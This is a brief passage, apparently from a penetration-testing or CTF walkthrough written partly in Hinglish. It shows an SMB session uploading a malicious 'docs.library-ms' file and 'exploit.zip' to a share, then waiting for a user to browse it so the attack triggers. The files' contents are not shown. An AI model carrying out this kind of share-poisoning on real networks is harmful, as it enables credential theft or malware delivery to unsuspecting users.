...
```
smb: \> put docs.library-ms
putting file docs.library-ms as \docs.library-ms (12.3 kb/s) (average 12.3 kb/s)
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (45.1 kb/s) (average 28.7 kb/s)
```
Dono files upload ho gayi, ab wait karna hai kisi user ke share browse karne ka.
